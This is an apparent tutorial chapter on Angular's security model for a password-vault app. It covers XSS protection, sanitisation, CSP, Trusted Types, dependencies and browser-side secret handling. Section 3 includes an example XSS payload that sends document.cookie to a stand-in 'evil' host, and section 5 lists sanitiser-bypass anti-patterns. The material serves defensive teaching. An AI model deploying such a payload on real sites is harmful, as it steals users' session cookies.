# Angular's Security Model

Back to [Module 20](README.md) · Next: [Auth and token storage](02-auth-and-tokens.md)

## 1. Learning objectives

- Explain how Angular prevents cross-site scripting (XSS).
- Handle HTML, URLs and resources safely.
- Configure CSP and Trusted Types.
- Keep dependencies and secrets safe.
- Apply vault-specific rules for handling secrets in the browser.

## 2. Prerequisites

[Data binding](../02-components-and-templates/02-data-binding.md), [Directives](../05-directives/02-custom-attribute-directives.md).

## 3. What is XSS?

An attacker gets their JavaScript to run in your page — e.g. by saving a note titled `<img src=x onerror="fetch('https://evil/?t='+document.cookie)">` that later renders as HTML. In a vault app, XSS = stolen secrets. It is the #1 frontend threat for Myspce.

## 4. How Angular protects you

| Context | What Angular does |
|---|---|
| Interpolation `{{ note.title }}` | treated as **text**, never parsed as HTML |
| `[property]` bindings | values are set as DOM properties |
| `[innerHTML]` | **sanitised**: scripts, event handlers and dangerous URLs are stripped (warning in dev console) |
| `[href]`, `[src]` | URL sanitisation blocks `javascript:` URLs |
| `[style]` | sanitised |
| Templates | compiled at build time (AOT) — no runtime template compilation from strings |

You lose this protection when you:

- write to the DOM directly (`el.innerHTML = x`, `insertAdjacentHTML`, `document.write`);
- call `DomSanitizer.bypassSecurityTrustHtml/Url/ResourceUrl/Script/Style`;
- render user content with a third-party library that injects HTML;
- build templates dynamically (not possible in AOT apps — good).

## 5. Safe patterns for Myspce

### Rich-text notes

Notes are stored as editor JSON (assumption A5). Render them with the editor's own renderer or convert to HTML **and sanitise**:

```typescript
// features/notes/components/note-viewer.ts
import { Component, SecurityContext, computed, inject, input } from '@angular/core';
import { DomSanitizer } from '@angular/platform-browser';

@Component({
  selector: 'app-note-viewer',
  template: `<div class="prose dark:prose-invert" [innerHTML]="safeHtml()"></div>`,
})
export class NoteViewer {
  html = input.required<string>();            // produced from the note's JSON by a trusted renderer
  private sanitizer = inject(DomSanitizer);
  protected safeHtml = computed(() => this.sanitizer.sanitize(SecurityContext.HTML, this.html()) ?? '');
}
```

`[innerHTML]` already sanitises; calling `sanitize` explicitly documents intent and lets you reuse the result. Use a stricter allow-list library (e.g. DOMPurify) if you need fine control — then mark the **already-purified** output as trusted, never raw input.

### Links stored in credentials

```html
<!-- Angular blocks javascript: URLs; still validate on save (Signal Forms pattern) and open safely -->
<a [href]="cred().url" target="_blank" rel="noopener noreferrer">{{ cred().url }}</a>
```

`rel="noopener noreferrer"` stops the opened site from controlling your tab via `window.opener`.

### Never

```typescript
// ❌ all of these bypass Angular's protection with user-controlled data
this.el.nativeElement.innerHTML = note.title;
this.sanitizer.bypassSecurityTrustHtml(note.content);
this.sanitizer.bypassSecurityTrustResourceUrl(userProvidedUrl);   // e.g. in an <iframe>
```

## 6. Content Security Policy (CSP)

A CSP header tells the browser which sources may run scripts, load styles, connect, etc. Even if XSS slips through, a strict CSP blocks injected scripts and exfiltration.

Recommended starting policy for Myspce (served by nginx — [deployment note](04-deployment-and-ci.md)):

```text
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self' 'nonce-{RANDOM}';
  img-src 'self' data: blob: https://*.amazonaws.com https://tile.openstreetmap.org;
  font-src 'self';
  connect-src 'self' https://*.amazonaws.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self' https://accounts.google.com;
  object-src 'none';
  require-trusted-types-for 'script';
  trusted-types angular angular#unsafe-bypass;
```

Notes:

- Angular injects component styles at runtime; support a nonce with `ngCspNonce="…"` on the root element or the `CSP_NONCE` token, and have the server generate a nonce per response. With a static nginx setup, `'unsafe-inline'` for **styles** is a pragmatic compromise; keep **scripts** strict.
- The build's inline critical-CSS loader may need adjusting (`"optimization": { "styles": { "inlineCritical": false } }`) under strict CSPs.
- Trusted Types make DOM XSS sinks (`innerHTML`, etc.) reject plain strings; Angular supports the `angular` policy. Remove `angular#unsafe-bypass` if you never use `bypassSecurityTrust*`.
- Roll out with `Content-Security-Policy-Report-Only` first, check the console, then enforce.

## 7. Dependencies

```bash
npm audit --omit=dev           # known vulnerabilities in production deps
npm outdated
ng update                      # Angular-aware updates
```

- Enable Dependabot/Renovate on the repo.
- Prefer few, well-maintained libraries; every dependency can run code in your users' browsers.
- Pin with `package-lock.json`; use `npm ci` in CI.
- Review install scripts of new packages; avoid typo-squatted names.

## 8. Secrets in frontend code

Everything in the bundle is public. That includes `environment.ts`, source maps (if deployed), and any string in your code.

| OK in frontend | Never in frontend |
|---|---|
| API base URL | JWT signing secret |
| Google OAuth **client ID** | OAuth **client secret** |
| Public S3 bucket name | AWS access keys |
| Feature flag defaults | DB passwords, KMS key IDs with permissions |

Don't deploy source maps publicly (`"sourceMap": false` in production, or upload them only to an error-tracking service).

## 9. Vault-specific rules (Myspce)

| Rule | Implementation |
|---|---|
| Lists never contain secrets | `CredentialSummary` type; `/credentials` list API omits passwords |
| Reveal is explicit and audited | `POST /credentials/:id/reveal` with re-auth |
| Revealed secrets don't linger | keep in a local signal; clear on timeout, navigation, lock; never put in a store or URL |
| Clipboard auto-clear | 30 s clear in `CopyToClipboard` |
| No secrets in logs | never `console.log` API responses from `/reveal` or forms with passwords |
| No secrets in storage | never localStorage/sessionStorage/IndexedDB |
| Auto-lock on inactivity | `IdleLock` clears revealed state and requires re-auth |
| Autocomplete hygiene | `autocomplete="new-password"` on vault password inputs; `off` on usernames in vault forms |
| No third-party scripts on vault pages | no analytics/ads/chat widgets loaded in the app |

```typescript
// a revealed secret that clears itself
protected revealed = signal<string | null>(null);
async reveal() {
  const { secret } = await firstValueFrom(this.api.reveal(this.credential().id));
  this.revealed.set(secret);
  setTimeout(() => this.revealed.set(null), 20_000);
}
```

## 10. Common mistakes

| Mistake | Fix |
|---|---|
| `bypassSecurityTrustHtml` "to make the warning go away" | sanitise or render as text |
| Allowing `javascript:` URLs in saved credentials | validate scheme on save; Angular blocks it on render |
| Third-party widgets in the vault | keep the app script-clean |
| Shipping source maps publicly | disable or upload privately |
| Disabling CSP to fix a style error | add a nonce or allow styles narrowly |

## 11. Debugging guide

- Console "WARNING: sanitizing HTML stripped some content" → something tried to inject unsafe HTML; find the source.
- CSP violations appear in the console with the blocked URL and directive — adjust only the specific directive.
- Trusted Types errors name the sink (`innerHTML`) — find who writes to it.

## 12. Interview questions

- **Q: How does Angular prevent XSS?** It treats bound values as untrusted, escapes interpolation, sanitises HTML/URL/style contexts, and compiles templates at build time.
- **Q: When is `bypassSecurityTrust*` acceptable?** Only for values you fully control or have already sanitised, never for user input.
- **Q: What does CSP add?** A browser-enforced allow-list that blocks injected scripts and limits where data can be sent, mitigating XSS impact.

## 13. Completion checklist

- [ ] No direct DOM HTML writes or unchecked bypasses in my code.
- [ ] CSP drafted and tested in report-only mode.
- [ ] Vault rules implemented for reveal, clipboard, storage and logging.
